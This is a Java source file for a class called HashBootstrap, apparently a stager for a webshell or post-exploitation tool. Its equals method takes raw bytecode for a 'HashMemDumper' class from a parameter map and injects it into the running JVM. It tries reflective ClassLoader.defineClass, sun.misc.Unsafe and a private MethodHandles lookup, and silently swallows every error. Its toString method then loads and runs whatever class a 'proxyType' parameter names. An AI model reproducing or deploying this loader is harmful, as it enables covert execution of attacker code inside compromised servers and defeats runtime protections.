import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
public class HashBootstrap {
    private HashMap parameterMap;
    public HashBootstrap() {
    }
    public boolean equals(Object obj) {
        try {
            this.parameterMap = (HashMap) obj;
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            String[] deps = {"HashMemDumper"};
            Method defineClassMethod = null;
            try {
                defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",
                        String.class, byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
            } catch (Exception ex) {
            }
            Object theUnsafe = null;
            Method unsafeDefineClass = null;
            try {
                Class unsafeClass = Class.forName("sun.misc.Unsafe");
                Field theUnsafeField = unsafeClass.getDeclaredField("theUnsafe");
                theUnsafeField.setAccessible(true);
                theUnsafe = theUnsafeField.get(null);
                unsafeDefineClass = unsafeClass.getMethod("defineClass",
                        String.class, byte[].class, int.class, int.class,
                        ClassLoader.class, java.security.ProtectionDomain.class);
            } catch (Exception ignored) {
            }
            Object trustedLookup = null;
            Method mhDefineClass = null;
            try {
                Class mhClass = Class.forName("java.lang.invoke.MethodHandles");
                Class lookupClass = Class.forName("java.lang.invoke.MethodHandles$Lookup");
                Method lookupMethod = mhClass.getMethod("lookup");
                Object callerLookup = lookupMethod.invoke(null);
                Method privLookupIn = mhClass.getMethod("privateLookupIn", Class.class, lookupClass);
                trustedLookup = privLookupIn.invoke(null, Object.class, callerLookup);
                mhDefineClass = lookupClass.getMethod("defineClass", byte[].class);
            } catch (Exception ignored) {
            }
            for (int i = 0; i < deps.length; i++) {
                String dep = deps[i];
                byte[] bytes = (byte[]) this.parameterMap.get("class_" + dep);
                if (bytes != null) {
                    try {
                        classLoader.loadClass(dep);
                    } catch (ClassNotFoundException e) {
                        if (defineClassMethod != null) {
                            try {
                                defineClassMethod.invoke(classLoader, dep, bytes, 0, bytes.length);
                            } catch (Exception ignored) {
                            }
                        }
                        boolean loaded = false;
                        try {
                            classLoader.loadClass(dep);
                            loaded = true;
                        } catch (ClassNotFoundException ignored) {
                        }
                        if (!loaded && theUnsafe != null && unsafeDefineClass != null) {
                            try {
                                unsafeDefineClass.invoke(theUnsafe, dep, bytes,
                                        0, bytes.length, classLoader, null);
                                loaded = true;
                            } catch (Exception ignored) {
                            }
                        }
                        if (!loaded && trustedLookup != null && mhDefineClass != null) {
                            try {
                                mhDefineClass.invoke(trustedLookup, new Object[]{bytes});
                            } catch (Exception ignored) {
                            }
                        }
                    }
                }
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    public String toString() {
        try {
            String proxyType = new String((byte[]) this.parameterMap.get("proxyType"));
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass(proxyType);
            Object instance = clazz.newInstance();
            Method equalsMethod = clazz.getMethod("equals", Object.class);
            equalsMethod.invoke(instance, this.parameterMap);
            Method toStringMethod = clazz.getMethod("toString");
            toStringMethod.invoke(instance);
        } catch (Throwable e) {
            if (this.parameterMap != null) {
                this.parameterMap.put("result", ("Bootstrap Error: " + e.toString()).getBytes());
            }
        }
        return "";
    }
}
